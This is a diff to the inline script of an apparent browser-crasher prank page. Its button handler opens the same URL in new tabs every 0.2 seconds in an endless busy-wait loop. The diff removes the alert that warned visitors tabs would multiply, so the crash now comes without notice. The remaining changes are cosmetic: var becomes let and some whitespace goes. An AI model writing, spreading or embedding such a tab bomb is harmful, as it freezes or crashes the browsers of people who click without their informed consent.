@@ -59,15 +59,13 @@ body {
 <script>
   const url = "https://castoroides.github.io/burakura/burakura_tab.html"
 
-  alert("「完了」を押すと0.2秒間隔でタブが増殖していきます。");
-
   function buttonClick(){
-    
+
     // 無限ループでタブを増やす
     while(true){
       window.open(url, "_blank")
       // 0.2秒待機
-      var startDate = new Date();
+      let startDate = new Date();
       while (new Date() - startDate < 200);
     }
   }
